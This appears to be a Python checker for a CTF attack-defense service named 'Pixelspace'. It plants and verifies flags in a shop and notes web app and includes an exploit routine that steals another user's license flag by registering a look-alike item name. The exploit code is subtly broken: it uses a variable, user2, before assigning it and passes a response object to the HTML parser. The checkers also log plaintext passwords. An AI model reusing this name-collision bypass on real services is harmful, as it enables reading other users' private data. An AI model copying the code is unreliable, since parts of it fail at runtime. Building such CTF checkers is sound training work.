import secrets
from sqlite3 import threadsafety
from httpx import AsyncClient
from util import *
from essential_generators import DocumentGenerator
import html
from datetime import datetime
from bs4 import BeautifulSoup
from time import time

from enochecker3 import(
    ChainDB,
    Enochecker,

    MumbleException,

    #FLAG-Message-Tasks
    GetflagCheckerTaskMessage,
    PutflagCheckerTaskMessage,

    #NOISE-Message-Tasks
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,

    #HAVOC-Message-Tasks
    HavocCheckerTaskMessage,
    ExploitCheckerTaskMessage,
)

from enochecker3.utils import FlagSearcher, assert_equals, assert_in

gen = DocumentGenerator()

checker = Enochecker("Pixelspace",8010)
def app(): return checker.app
####################### GETFLAG AND PUTFLAG #########################
@checker.putflag(0)
async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB,logger: LoggerAdapter) -> str:   
    t1 = datetime.now()
    item_name = exploitable_item_name(min_length=5).upper()
    user = await register_user(client=client,logger=logger,db=db,chain_id=task.task_chain_id)
    t2 = datetime.now()
    d1 = t2 -t1
    logger.debug(f"Time - putflag_license (register_user) {d1.total_seconds()} s")
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': html.escape(item_name),
        'logged_in': True,
        'flag_str': task.flag,
        'username': user['username'],
        'password': user['password1'],
    }
    
    item_id = await create_ShopItem(client=client,logger=logger,db=db,kwargs=shop_item_kwargs)
    t3 = datetime.now()
    d2 = t3-t2
    logger.debug(f"Time - putflag_license (create_ShopItem) {d2.total_seconds()} s")
    shop_listing_kwargs = {
        'item_id': item_id,
        'item_price': random.randint(1825361100,2147483646),
        'description': html.escape(gen.sentence()),
        'username': user['username'],
        'password': user['password1'],
    }
    logger.debug(f"PUTFLAG_LICENSE: username:{user['username']} , password: {user['password1']} , item_name: {item_name}")
    listing_id = await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
    t4 = datetime.now()
    d3 = t4-t3
    logger.debug(f"Time - putflag_license (create_ShopListing) {d3.total_seconds()} s")
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    t5 = datetime.now()
    d4 = t5-t4
    logger.debug(f"Time - putflag_license (logout_user) {d4.total_seconds()} s")
    await db.set("item_id", item_id)
    await db.set("listing_id", listing_id)
    await db.set("user", {'user':user['username'],'password':user['password1']})
    t6 = datetime.now()
    d5 = t6-t5
    logger.debug(f"Time - putflag_license (create_ShopListing) {d5.total_seconds()} s")
    logger.debug(f"PUTFLAG_LICENSE - Total time {(t6-t1).total_seconds()} s")
    return json.dumps({'listing_id':listing_id})


@checker.getflag(0)
async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB,logger: LoggerAdapter) -> None:
    t0 = datetime.now()
    try: 
        user = await db.get("user")
    except KeyError:
        raise MumbleException("Could not retrieve USER from ChainDB!")

    try:
        item_id = await db.get("item_id")
        listing_id = await db.get("listing_id")
    except KeyError:
        raise MumbleException("Could not retrieve ITEM_NAME from ChainDB!")    

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
    try:
        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}/")
        response = await client.get(f'user_items/{item_id}/',follow_redirects=True)
    except RequestError:
        raise MumbleException("GETFLAG_LICENSE  - Item didnt got created!")
    try:
        logger.debug(f"REQUESTURL: {client.base_url} shop/item/{listing_id}/")
        response = await client.get(f'shop/item/{listing_id}/',follow_redirects=True)
    except RequestError:
        raise MumbleException("GETFLAG_LICENSE  - Item is not enlisted!")
  
    try:
        logger.debug(f"REQUESTURL: {client.base_url} user_items/license/{item_id}/")
        response = await client.get(f"user_items/license/{item_id}/",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"ERROR - getflag_license: VIEWING LICENSE FROM ITEM_ID: {item_id} !")
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    assert_in(html.escape(task.flag),response.text,"ERROR - getflag_license: FLAG NOT IN LICENSE!")
    t1= datetime.now()
    logger.debug(f"GET_FLAG_LICENSE - Total time {(t1-t0).total_seconds()} s")


####################### GETNOISE AND PUTNOISE #########################

@checker.putnoise(0)
async def put_noise_base_functions(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB,logger: LoggerAdapter) -> None:
    t0= datetime.now()
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    item_name = ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15)))
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,15))),
        'username': user['username'],
        'password': user['password1'],
    }
    logger.debug(f"ID={task.task_chain_id} PUT_NOISE_BASE_FUNCTIONS (CREATE_SHOPITEM): username:{user['username']} , password: {user['password1']} , item_name: {item_name}")
    item_id = await create_ShopItem(client=client,logger=logger,db=db,kwargs=shop_item_kwargs)
    logger.debug(f"ID={task.task_chain_id} PUT_NOISE_BASE_FUNCTIONS (CREATE_SHOPITEM): item_id: {item_id}")
    shop_listing_kwargs = {
        'item_id': item_id,
        'item_price': random.randint(1,1000),
        'description': ''.join(secrets.choice(string.ascii_letters) for i in range(random.randint(5,25))),
        'username': user['username'],
        'password': user['password1'],
    }
    logger.debug(f"ID={task.task_chain_id} PUT_NOISE_BASE_FUNCTIONS (CREATE_SHOPLISTING): item_id: {shop_listing_kwargs['item_id']} , price: {shop_listing_kwargs['item_price']} , {shop_listing_kwargs['description']}")
    listing_id = await create_ShopListing(client=client,logger=logger,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    await db.set("item_id", item_id)
    await db.set("listing_id",listing_id)
    await db.set("user", {'user':user['username'],'password':user['password1']})
    t1= datetime.now()
    logger.debug(f"PUT_NOISE_BASE - Total time {(t1-t0).total_seconds()} s")


@checker.getnoise(0)
async def get_noise_base_functions(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    t0=datetime.now()
    try: 
        user = await db.get("user")
        item_id = await db.get("item_id")
        listing_id = await db.get("listing_id")
    except KeyError:
        raise MumbleException("Could not retrieve data from ChainDB!")
   
    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }

    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)

    try:
        logger.debug(f"REQUESTURL: {client.base_url} user_items/{item_id}/")
        response = await client.get(f'user_items/{item_id}/',follow_redirects=True)
    except RequestError:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS - Error while requesting item from user_items!")

    try:
        logger.debug(f"REQUESTURL: {client.base_url} shop/item/{listing_id}/")
        response = await client.get(f'shop/item/{listing_id}/',follow_redirects=True)
    except RequestError:
        raise MumbleException("GET_NOISE_BASE_FUNCTIONS  - Item is not enlisted!")
  
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    t1 = datetime.now()
    logger.debug(f"GET_NOISE_BASE - Total time {(t1-t0).total_seconds()} s")

    
@checker.putnoise(1)
async def put_noise_notes(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB,logger: LoggerAdapter) -> None:
    t0 = datetime.now()
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    note = gen.sentence()
    note_kwargs = {
        'note': note,
        'logged_in': True,
        'username': user['username'],
        'password': user['password1'],
    }
    logger.debug(f"ID={task.task_chain_id} PUT_NOISE_NOTES : username:{user['username']} , password: {user['password1']} , note: {note}")
    await create_note(client=client,logger=logger,db=db,kwargs=note_kwargs)
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    await db.set("noise", note)
    await db.set("user", {'user':user['username'],'password':user['password1']})
    t1 = datetime.now()
    logger.debug(f"PUT_NOISE_NOTES - Total time {(t1-t0).total_seconds()} s")

@checker.getnoise(1)
async def get_noise_notes(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB,logger: LoggerAdapter) -> None:
    t0 = datetime.now()
    try: 
        user = await db.get("user")
        note = await db.get("noise")
    except KeyError:
        raise MumbleException("ERROR - get_noise_notes: COULD NOT RETRIEVE DATA FROM ChainDB!")

    login_kwargs={
        'username': user['user'],
        'password': user['password'],
    }
    await login(client=client,logger=logger,db=db,kwargs=login_kwargs)
    try:
        logger.debug(f"REQUESTURL: {client.base_url} notes/")
        response = await client.get('notes/',follow_redirects=True)
    except RequestError:
        raise MumbleException("ERROR - get_noise_notes: COULD NOT RETRIEVE USER NOTES!")

    assert_in(html.escape(note),response.text, f"ERROR - get_noise_notes: {note} NOT IN RESPONSE")
    await logout_user(client=client,logger=logger,db=db,kwargs={'logged_in':True})
    t1 = datetime.now()
    logger.debug(f"GET_NOISE_NOTES - Total time {(t1-t0).total_seconds()} s")


@checker.havoc(0)
async def havoc_endpoints(task: HavocCheckerTaskMessage, client: AsyncClient,logger: LoggerAdapter) -> None:
    t0 = datetime.now()
    endpoints = [
        '',
        'signup/',
        'login/',
        'shop/1/',
        'new_item/',
       
    ]
    for e in endpoints:
        try:
            logger.debug(f"REQUESTURL: {client.base_url} {e}")
            response = await client.get(e,follow_redirects=True)
            logger.debug(f"HAVOC - Endpoint {e} reachable")
        except RequestError:
            raise MumbleException(f"HAVOC - Cannot reach endpoint {e} !")
    t1 = datetime.now()
    logger.debug(f"HAVOC_ENDPOINTS - Total time {(t1-t0).total_seconds()} s")


@checker.havoc(1)
async def havoc_default_user_params(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter,db: ChainDB) -> None:
    t0=datetime.now()
    user = await register_user(client=client,logger=logger,db=db,chain_id=None)
    try:
        logger.debug(f"REQUESTURL: {client.base_url} user_items/")
        response = await client.get("user_items/",follow_redirects=True)
    except RequestError:
            raise MumbleException(f"HAVOC - Cannot reach verify default user parameters !")
    
    if not "Credits: 100" in response.text:
        raise MumbleException("ERROR - HAVOC: default credits got manipulated!")
    else:
        logger.debug("DEFAULT USER PARAM (Credits) is OK")
    if not "Profile_id: " in response.text:
        raise MumbleException("ERROR - HAVOC: User profile_id is not visible!")
    else:
        logger.debug("DEFAULT USER PARAM (Profile_id) is OK")
    
    await logout_user(client=client,logger=logger,db=None,kwargs={'logged_in':True})
    t1=datetime.now()
    logger.debug(f"HAVOC_USER_PARAMS - Total time {(t1-t0).total_seconds()} s")

@checker.exploit(0)
async def exploit_license(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> None:

    user1 = await register_user(client=client,logger=logger,db=None,chain_id=None)
    logger.debug(f"EXPLOIT_LICENSE - attack info {task.attack_info}")
    attack_info = json.loads(task.attack_info)['listing_id']
    logger.debug(f"EXPLOIT_LICENSE - URL : {client.base_url}/shop/item/{attack_info}/")

    response = await client.get(f"shop/item/{attack_info}/")
   
    logger.debug(f"EXPLOIT_LICENSE - get shop_item: {response.text}")
    data = BeautifulSoup(response.text,'html.parser')
    name = data.find_all('h3')
    logger.debug(f"EXPLOIT_LICENSE - name: {name}")
    item_name = str(name[0])[32:-5]

   
    exploit_name = await make_item_name_exploitable(item_name)
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': exploit_name,
        'logged_in': True,
        'flag_str': "I STOLE A FLAG",
        'username': user1['username'],
        'password': user1['password1'],
    }
    item_id = await create_ShopItem(client=client,logger=logger,db=None,kwargs=shop_item_kwargs)

    shop_listing_kwargs = {
        'item_id': item_id,
        'item_price': 1,
        'description': html.escape(gen.sentence()),
        'username': user2['username'],
        'password': user2['password1'],
    }
    listing_id = await create_ShopListing(client=client,logger=logger,db=None,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=logger,db=None,kwargs={'logged_in':True})


    user2 = await register_user(client=client,logger=logger,db=None,chain_id=None)
    try:
        response = await client.get(f"shop/item/{listing_id}/",follow_redirects=True)
    except RequestError:
        raise MumbleException("EXPLOIT - cannot request endpoint!")
    
    data = BeautifulSoup(response,'html.parser')
    real_item_link = data.find_all('a')
    correct_link = ""
    for r_link in real_item_link:
      if item_name in str(r_link):
        correct_link = str(r_link)
        break
    correct_item_id = correct_link.split('"')[1]

    try:
        response = await client.get(f"user_items/license/{correct_item_id}/")
    except RequestError:
        raise MumbleException("EXPLOIT - cannot request endpoint!")

    if flag := searcher.search_flag(response.text):
        return flag
    
if __name__ == "__main__":
    checker.run()